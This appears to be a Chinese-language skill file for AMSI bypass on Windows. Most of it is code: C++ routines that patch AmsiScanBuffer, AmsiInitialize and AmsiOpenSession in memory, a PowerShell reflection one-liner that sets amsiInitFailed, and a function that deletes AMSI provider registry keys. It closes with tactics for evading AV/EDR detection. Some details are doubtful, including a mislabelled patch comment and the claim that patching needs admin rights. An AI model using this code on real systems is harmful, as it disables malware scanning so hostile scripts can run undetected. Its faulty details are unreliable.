---
name: "amsi-bypass"
description: "AMSI (Antimalware Scan Interface) bypass techniques for PowerShell, .NET, and script-based attacks"
version: "1.0.0"
---

# AMSI Bypass

> AMSI (Antimalware Scan Interface) 是Windows提供的接口，允许应用程序和服务与杀毒软件对接。它被PowerShell、.NET和其他环境大量使用，用于在执行前扫描脚本和代码。

## 背景

AMSI在Windows 10中引入，用于提供针对脚本攻击的增强保护。它被以下组件调用：

- **PowerShell** (通过 `System.Management.Automation`)
- **.NET 编译和互操作** (C#/VB.NET)
- **Windows Script Host** (VBScript, JScript)
- **Office VBA宏**
- **UWP应用程序**

## AmsiScanBuffer 修补

### 方法一：返回值修补

修补函数以返回 `S_OK` (0) 并将 `result` 设置为 `AMSI_RESULT_NOT_DETECTED`。

```cpp
#include <windows.h>

// 修补后的函数
HRESULT WINAPI PatchedAmsiScanBuffer(
    HAMSICONTEXT,
    PVOID,
    ULONG,
    LPCWSTR,
    HAMSISESSION,
    AMSI_RESULT *result
) {
    *result = AMSI_RESULT_NOT_DETECTED;
    return S_OK;
}

void PatchAmsiScanBuffer() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");

    DWORD oldProtect;
    VirtualProtect(pAmsiScanBuffer, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
    *(BYTE*)pAmsiScanBuffer = 0xC3; // ret指令

    VirtualProtect(pAmsiScanBuffer, 1, oldProtect, &oldProtect);
    printf("[+] AmsiScanBuffer patched\n");
}
```

### 方法二：完整函数替换

用返回"未检测到"的存根替换整个函数。

```cpp
void FullPatchAmsiScanBuffer() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");

    BYTE patch[] = {
        0xB8, 0x57, 0x00, 0x07, 0x80,  // mov eax, 0x80070057
        0xC3                           // ret
    };

    DWORD oldProtect;
    VirtualProtect(pAmsiScanBuffer, sizeof(patch), 
                   PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(pAmsiScanBuffer, patch, sizeof(patch));
    VirtualProtect(pAmsiScanBuffer, sizeof(patch), oldProtect, &oldProtect);
}
```

## AmsiInitialize 修补

修补初始化函数使AMSI启动失败。

```cpp
void PatchAmsiInitialize() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    FARPROC pAmsiInit = GetProcAddress(hAmsi, "AmsiInitialize");

    DWORD oldProtect;
    VirtualProtect(pAmsiInit, 1, PAGE_EXECUTE_READWRITE, &oldProtect);

    // x64: xor eax, eax; dec eax (E_FAIL)
    BYTE patch[] = { 0x31, 0xC0, 0x48, 0xFF, 0xC8, 0xC3 };

    memcpy(pAmsiInit, patch, sizeof(patch));
    VirtualProtect(pAmsiInit, sizeof(patch), oldProtect, &oldProtect);

    printf("[+] AmsiInitialize patched\n");
}
```

## 上下文修补

某些AMSI实现传递上下文，修剪处理AMSI上下文的函数可能更可靠。

```cpp
void PatchAmsiOpenSession() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    FARPROC pAmsiOpenSession = GetProcAddress(hAmsi, "AmsiOpenSession");

    DWORD oldProtect;
    VirtualProtect(pAmsiOpenSession, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
    *(BYTE*)pAmsiOpenSession = 0xC3;  // ret

    VirtualProtect(pAmsiOpenSession, 1, oldProtect, &oldProtect);
    printf("[+] AmsiOpenSession patched\n");
}
```

## 基于反射的绕过

在托管环境（如PowerShell）中使用.NET反射来绕过AMSI。

```powershell
# PowerShell 示例
$ref = [System.Reflection.Assembly].LoadWithPartialName("System.Management.Automation")
$amsi = $ref.GetType("System.Management.Automation.AmsiUtils")
$field = $amsi.GetField("amsiInitFailed","NonPublic,Static")
$field.SetValue($null,$true)
Write-Host "AMSI bypassed!"
```

## 提供商禁用

通过注册表禁用特定的AMSI提供商。

```cpp
void DisableAmsiProvider(const wchar_t* providerGuid) {
    wchar_t keyPath[MAX_PATH];
    swprintf_s(keyPath, L"SOFTWARE\\Microsoft\\AMSI\\Providers\\%s", providerGuid);

    HKEY hKey;
    RegDeleteKeyW(HKEY_LOCAL_MACHINE, keyPath);
}

// 使用示例
DisableAmsiProvider(L"{00000000-0000-0000-0000-000000000000}");
```

## 检测与对抗

### AV/EDR如何检测AMSI绕过

- **内存扫描**：检查AmsiScanBuffer是否被修改
- **内联挂钩监控**：监控对amsi.dll区域的修改
- **行为分析**：检测修改代码段的尝试
- **ETW事件**：ETW可能记录修改受保护内存的尝试

### 对抗策略

- 使用基于反射的绕过（不修改内存）
- 通过反射使用 `amsiInitFailed` 标志（较不可疑）
- 仅修补特定字节（最小足迹）
- 稍后恢复原始字节以减少检测窗口

## 注意事项和限制

- Windows 10 Build 14393+：AMSI默认启用
- 某些杀毒解决方案实现自己的AMSI类扫描
- AMSI绕过通常在较新版本上触发Defender
- 内存修改需要提升的权限（管理员）

## 参考资源

- [PayloadsAllTheThings - AMSI Bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/AMSI%20Bypass.md)
- [Covenant - AMSI Bypass](https://github.com/cobbr/Covenant)
- [SharpHound - Reflection-based Bypass](https://github.com/BloodHoundAD/SharpHound)
- [S3cur3Th1sSh1t - AmsiBypass](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
